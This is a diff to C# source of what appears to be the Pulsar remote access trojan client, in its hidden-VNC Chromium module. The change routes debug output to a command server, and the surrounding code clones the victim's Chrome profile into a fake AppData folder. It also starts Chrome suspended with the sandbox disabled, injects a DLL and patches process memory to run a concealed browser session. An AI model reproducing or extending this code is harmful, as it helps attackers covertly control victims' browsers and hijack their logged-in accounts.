@@ -7,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Pulsar.Client.LoggingAPI;
 
 namespace Pulsar.Client.Helper.HVNC.Chromium
 {
@@ -19,7 +20,6 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         private string ChromiumDllPath { get; set; }
         private string ChromiumInstallFolderPath { get; set; }
         private string ChromiumBrowserName { get; set; }
-
         private string RealAppData { get; set; } = null;
         private string FakeAppData { get; set; } = null;
         private string ChromiumDllName { get; set; } = null;
@@ -100,7 +100,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     if (folderName.Length > 0 && char.IsDigit(folderName[0]))
                     {
                         string dllPath = Path.Combine(dir, ChromiumDllName);
-                        Debug.WriteLine(dllPath);
+                        LogToServer(dllPath);
                         if (File.Exists(dllPath))
                         {
                             versionFolders.Add(dir);
@@ -116,7 +116,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"> Error finding Chrome version: {ex.Message}");
+                LogToServer($"Error finding Chrome version: {ex.Message}");
                 return string.Empty;
             }
         }
@@ -132,54 +132,50 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             // I admit when I'm defeated. This is 100% chatGPT. We were able to figure out offsets but not the RVA portion and automating a way to get the offset. (Thank you gpt4.1).
             try
             {
-                Debug.WriteLine($"> FileOffsetToRVA called for '{filePath}', fileOffset=0x{fileOffset:X}");
+                LogToServer($"FileOffsetToRVA called for '{filePath}', fileOffset=0x{fileOffset:X}");
 
                 if (!File.Exists(filePath))
                 {
-                    Debug.WriteLine($"> ERROR: File '{filePath}' does not exist");
+                    LogToServer($"ERROR: File '{filePath}' does not exist");
                     return 0;
                 }
 
                 byte[] fileData = File.ReadAllBytes(filePath);
-                Debug.WriteLine($"> Read {fileData.Length} bytes from file");
-
-                if (fileData.Length < 64)
+                LogToServer($"Read {fileData.Length} bytes from file"); if (fileData.Length < 64)
                 {
-                    Debug.WriteLine("> ERROR: File is too small to be a valid PE file");
+                    LogToServer("ERROR: File is too small to be a valid PE file");
                     return 0;
                 }
 
                 // Read DOS header to find PE header offset
                 uint peOffset = BitConverter.ToUInt32(fileData, 0x3C);
-                Debug.WriteLine($"> PE header offset: 0x{peOffset:X}");
+                LogToServer($"PE header offset: 0x{peOffset:X}");
 
                 if (peOffset + 24 > fileData.Length)
                 {
-                    Debug.WriteLine("> ERROR: Invalid PE header offset");
+                    LogToServer("ERROR: Invalid PE header offset");
                     return 0;
                 }
 
                 // Verify PE signature
                 uint peSignature = BitConverter.ToUInt32(fileData, (int)peOffset);
-                Debug.WriteLine($"> PE signature: 0x{peSignature:X} (should be 0x00004550)");
-
-                if (peSignature != 0x00004550)  // "PE\0\0"
+                LogToServer($"PE signature: 0x{peSignature:X} (should be 0x00004550)"); if (peSignature != 0x00004550)  // "PE\0\0"
                 {
-                    Debug.WriteLine("> ERROR: Invalid PE signature");
+                    LogToServer("ERROR: Invalid PE signature");
                     return 0;
                 }
 
                 // Get number of sections
                 ushort numSections = BitConverter.ToUInt16(fileData, (int)peOffset + 6);
-                Debug.WriteLine($"> Number of sections: {numSections}");
+                LogToServer($"Number of sections: {numSections}");
 
                 // Get size of optional header
                 ushort sizeOfOptionalHeader = BitConverter.ToUInt16(fileData, (int)peOffset + 20);
-                Debug.WriteLine($"> Size of Optional Header: {sizeOfOptionalHeader}");
+                LogToServer($"Size of Optional Header: {sizeOfOptionalHeader}");
 
                 // Find section headers offset (PE header + size of FileHeader + size of OptionalHeader)
                 uint sectionHeadersOffset = peOffset + 24 + sizeOfOptionalHeader;
-                Debug.WriteLine($"> Section headers offset: 0x{sectionHeadersOffset:X}");
+                LogToServer($"Section headers offset: 0x{sectionHeadersOffset:X}");
 
                 // Print section info for debugging
                 for (int i = 0; i < numSections; i++)
@@ -187,7 +183,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     uint sectionOffset = sectionHeadersOffset + (uint)(i * 40); // Each section header is 40 bytes
                     if (sectionOffset + 40 > fileData.Length)
                     {
-                        Debug.WriteLine($"> ERROR: Section header {i + 1} extends beyond file size");
+                        LogToServer($"ERROR: Section header {i + 1} extends beyond file size");
                         break;
                     }
 
@@ -198,28 +194,26 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     uint sizeOfRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 16);
                     uint pointerToRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 20);
 
-                    Debug.WriteLine($"> Section {i + 1}: Name='{sectionName}', VirtualSize=0x{virtualSize:X}, VirtualAddress=0x{virtualAddress:X}, SizeOfRawData=0x{sizeOfRawData:X}, PointerToRawData=0x{pointerToRawData:X}");
-
-                    // Check if file offset is within this section
+                    LogToServer($"Section {i + 1}: Name='{sectionName}', VirtualSize=0x{virtualSize:X}, VirtualAddress=0x{virtualAddress:X}, SizeOfRawData=0x{sizeOfRawData:X}, PointerToRawData=0x{pointerToRawData:X}");                    // Check if file offset is within this section
                     if (fileOffset >= pointerToRawData && fileOffset < pointerToRawData + sizeOfRawData)
                     {
                         uint offsetWithinSection = fileOffset - pointerToRawData;
                         uint rva = virtualAddress + offsetWithinSection;
 
-                        Debug.WriteLine($"> File offset 0x{fileOffset:X} found in section '{sectionName}' (#{i + 1})");
-                        Debug.WriteLine($"> Offset within section: 0x{offsetWithinSection:X}");
-                        Debug.WriteLine($"> Calculated RVA: 0x{rva:X}");
+                        LogToServer($"File offset 0x{fileOffset:X} found in section '{sectionName}' (#{i + 1})");
+                        LogToServer($"Offset within section: 0x{offsetWithinSection:X}");
+                        LogToServer($"Calculated RVA: 0x{rva:X}");
 
                         return rva;
                     }
                 }
 
-                Debug.WriteLine($"> ERROR: File offset 0x{fileOffset:X} not found in any section");
+                LogToServer($"ERROR: File offset 0x{fileOffset:X} not found in any section");
                 return 0;
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"> ERROR in FileOffsetToRVA: {ex.Message}");
+                LogToServer($"ERROR in FileOffsetToRVA: {ex.Message}");
                 return 0;
             }
         }
@@ -267,12 +261,12 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
 
             if (foundOffsets.Count > 0)
             {
-                Debug.WriteLine($"> Pattern found {foundOffsets.Count} time(s) at offsets: {string.Join(", ", foundOffsets.Select(x => $"0x{x:X8}"))}");
+                LogToServer($"Pattern found {foundOffsets.Count} time(s) at offsets: {string.Join(", ", foundOffsets.Select(x => $"0x{x:X8}"))}");
                 return foundOffsets[0];
             }
             else
             {
-                Debug.WriteLine("> Pattern not found.");
+                LogToServer("Pattern not found.");
                 return 0;
             }
         }
@@ -289,12 +283,12 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     return File.ReadAllBytes(ChromiumDllPath);
                 }
 
-                Debug.WriteLine($"> ERROR: Chrome DLL not found at '{ChromiumDllPath}'");
+                LogToServer($"ERROR: Chrome DLL not found at '{ChromiumDllPath}'");
                 return new byte[0];
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"> ERROR reading Chrome DLL: {ex.Message}");
+                LogToServer($"ERROR reading Chrome DLL: {ex.Message}");
                 return new byte[0];
             }
         }
@@ -317,11 +311,11 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 try
                 {
                     file.CopyTo(temppath, false);
-                } catch (Exception ex)
-                {
-                    Debug.WriteLine($"> ERROR copying file '{file.FullName}' to '{temppath}': {ex.Message}"); // Log the error
                 }
-                
+                catch (Exception ex)
+                {
+                    LogToServer($"ERROR copying file '{file.FullName}' to '{temppath}': {ex.Message}"); // Log the error
+                }
             });
 
             Parallel.ForEach(dirs, subdir =>
@@ -338,15 +332,15 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             if (Directory.Exists(FakeAppData)) Directory.Delete(FakeAppData, true);
             Directory.CreateDirectory(FakeAppData);
             DirectoryCopy(RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
-            Debug.WriteLine("> Cloned '{0}' to '{1}'", RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
+            LogToServer($"Cloned '{RealAppData + ChromiumBrowserName}' to '{FakeAppData + ChromiumBrowserName}'");
             Environment.SetEnvironmentVariable("LOCALAPPDATA", FakeAppData);
-            Debug.WriteLine("> Overrided %LOCALAPPDATA% environment variable");
+            LogToServer("Overrided %LOCALAPPDATA% environment variable");
         }
 
         private void DisableEnvironmentVariableFucker()
         {
             Environment.SetEnvironmentVariable("LOCALAPPDATA", RealAppData);
-            Debug.WriteLine("> Restored %LOCALAPPDATA% environment variable");
+            LogToServer("Restored %LOCALAPPDATA% environment variable");
         }
 
         private bool ApplyPatch(int pid, int offset, string dllName)
@@ -354,7 +348,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             try
             {
                 DllInjector.InjectDll(pid, ChromiumDllPath);
-                Debug.WriteLine($"> Loaded {dllName} into chrome process");
+                LogToServer($"Loaded {dllName} into chrome process");
 
                 Thread.Sleep(1000);
 
@@ -386,7 +380,6 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 if (!DllPatches.TryGetValue(dllName, out var patchBytes))
                     return false;
 
-
                 // Read the original bytes before patching
                 byte[] originalBytes = new byte[patchBytes.Length];
                 if (NativeMemory.ReadMemory(pid, targetFunction, originalBytes))
@@ -397,12 +390,12 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     {
                         originalHex.AppendFormat("0x{0:X2} ", b);
                     }
-                    Debug.WriteLine($"> Original bytes at target location ({originalBytes.Length} bytes):");
-                    Debug.WriteLine($"> {originalHex}");
+                    LogToServer($"Original bytes at target location ({originalBytes.Length} bytes):");
+                    LogToServer($"{originalHex}");
                 }
                 else
                 {
-                    Debug.WriteLine("> Failed to read original bytes from target location");
+                    LogToServer("Failed to read original bytes from target location");
                 }
 
                 // Print patch bytes
@@ -411,19 +404,19 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 {
                     bytesHex.AppendFormat("0x{0:X2} ", b);
                 }
-                Debug.WriteLine($"> Patch bytes to be applied ({patchBytes.Length} bytes):");
-                Debug.WriteLine($"> {bytesHex}");
+
+                LogToServer($"Patch bytes to be applied ({patchBytes.Length} bytes):");
+                LogToServer($"{bytesHex}");
 
                 int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, patchBytes);
                 return bytesWritten == patchBytes.Length;
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"> Error applying patch: {ex.Message}");
+                LogToServer($"Error applying patch: {ex.Message}");
                 return false;
             }
         }
-
 
         /// <summary>
         /// Starts Chrome with the patch applied
@@ -440,12 +433,12 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     int.TryParse(parts[0], out majorVersion);
             }
 
-            Debug.WriteLine($"> Detected Chrome version: {versionFolderName} (major version: {majorVersion})");
+            LogToServer($"Detected Chrome version: {versionFolderName} (major version: {majorVersion})");
 
             if (majorVersion > 0 && majorVersion <= 135)
             {
                 // No patch needed, just start Chrome normally
-                Debug.WriteLine($"> Chrome version {majorVersion} detected, skipping patch.");
+                LogToServer($"Chrome version {majorVersion} detected, skipping patch.");
                 int goodVerPID = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
                 Thread.Sleep(500);
                 ProcessHelper.ResumeProcess(goodVerPID);
@@ -456,28 +449,42 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             string dllName = Path.GetFileName(ChromiumDllPath);
 
             byte[] dllBytes = ReadChromeDll();
-            Debug.WriteLine($"> Read {dllBytes.Length} bytes from {dllName}");
+            LogToServer($"Read {dllBytes.Length} bytes from {dllName}");
             if (dllBytes.Length == 0) return;
 
             int offset = FindMatchOffset(dllBytes, dllName);
-            Debug.WriteLine($"> Offset of {dllName} target function: {offset:X8}");
+            LogToServer($"Offset of {dllName} target function: {offset:X8}");
             if (offset == 0) return;
-
 
             EnableEnvironmentVariableFucker();
             int chromePid = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
-            Debug.WriteLine($"> Created suspended chrome process: {chromePid}");
+            LogToServer($"Created suspended chrome process: {chromePid}");
             DisableEnvironmentVariableFucker();
 
             if (ApplyPatch(chromePid, offset, dllName))
             {
-                Debug.WriteLine($"> Applied patch to {dllName} in chrome process");
+                LogToServer($"Applied patch to {dllName} in chrome process");
                 ProcessHelper.ResumeProcess(chromePid);
-                Debug.WriteLine("> Resumed chrome process");
+                LogToServer("Resumed chrome process");
             }
             else
             {
                 Process.GetProcessById(chromePid).Kill();
+            }
+        }
+
+        private static void LogToServer(string message)
+        {
+            try
+            {
+                UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] {message}");
+
+                Debug.WriteLine($"[PrinterPatcher] {message}");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[PrinterPatcher] {message}");
+                Debug.WriteLine($"[PrinterPatcher] Error sending log to server: {ex.Message}");
             }
         }
     }
@@ -516,22 +523,22 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             if (buffer == null || buffer.Length == 0)
                 throw new ArgumentException("Buffer is null or empty.", nameof(buffer));
 
-            IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+            IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid); 
             if (hProcess == IntPtr.Zero)
             {
                 int error = Marshal.GetLastWin32Error();
-                Debug.WriteLine($"> Failed to open process for reading: {new System.ComponentModel.Win32Exception(error).Message}");
+                UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] Failed to open process for reading: {new System.ComponentModel.Win32Exception(error).Message}");
                 return false;
             }
 
             try
             {
                 bool result = ReadProcessMemory(hProcess, baseAddress, buffer, (UIntPtr)buffer.Length, out UIntPtr bytesRead);
-
+                
                 if (!result || bytesRead.ToUInt32() != buffer.Length)
                 {
                     int errorCode = Marshal.GetLastWin32Error();
-                    Debug.WriteLine($"> Failed to read memory: {new System.ComponentModel.Win32Exception(errorCode).Message}");
+                    UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] Failed to read memory: {new System.ComponentModel.Win32Exception(errorCode).Message}");
                     return false;
                 }
 
